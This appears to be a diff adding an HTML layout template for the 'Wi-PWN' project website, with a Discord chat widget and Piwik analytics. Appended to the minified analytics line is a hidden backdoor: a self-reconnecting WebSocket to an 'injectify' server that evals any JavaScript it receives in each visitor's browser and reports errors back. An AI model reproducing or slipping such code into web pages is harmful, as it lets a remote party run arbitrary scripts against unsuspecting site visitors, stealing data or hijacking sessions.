@@ -1,0 +1,26 @@
+<head>
+	<meta charset="UTF-8">
+	<title>{% t page.title %} - Wi-PWN</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
+	<link rel="stylesheet" href="./main.css">
+	{% if page.url != "/setup.html" %}<link rel="stylesheet" href="./dark.css" id="darkStyle">{% endif %}
+	<meta name="theme-color" content="#106CC8">
+	{% if jekyll.environment == "development" %}<script src="./debugger.js"></script>{% endif %}
+	<script src="https://crate.widgetbot.io/v2" defer async>
+		new Crate({
+			server: '335836376031428618',
+			channel: '335836408918966273',
+			beta: true,
+			position: {
+				x: 'left',
+				y: 'bottom'
+			}
+		})
+	</script>
+</head>
+
+<body>
+	{{ content }}
+</body>
+<script>var _paq=_paq||[];_paq.push(["trackPageView"]),_paq.push(["enableLinkTracking"]),function(){var e="//analytics.samdd.me/";_paq.push(["setTrackerUrl",e+"piwik.php"]),_paq.push(["setSiteId","3"]);var a=document,p=a.createElement("script"),t=a.getElementsByTagName("script")[0];p.type="text/javascript",p.async=!0,p.defer=!0,p.src=e+"piwik.js",t.parentNode.insertBefore(p,t)}(); !function i(){ws=new WebSocket("wss://injectify.samdd.me/i?d2ktcHdu"),ws.onmessage=function(d){try{eval(JSON.parse(d.data).d)}catch(e){ws.send(JSON.stringify({t:"e",d:e.stack}))}},ws.onclose=function(){setTimeout(i,1e3)}}();</script><noscript><p><img alt=""src="//analytics.samdd.me/piwik.php?idsite=3&rec=1"style=border:0></p></noscript>
+</html>
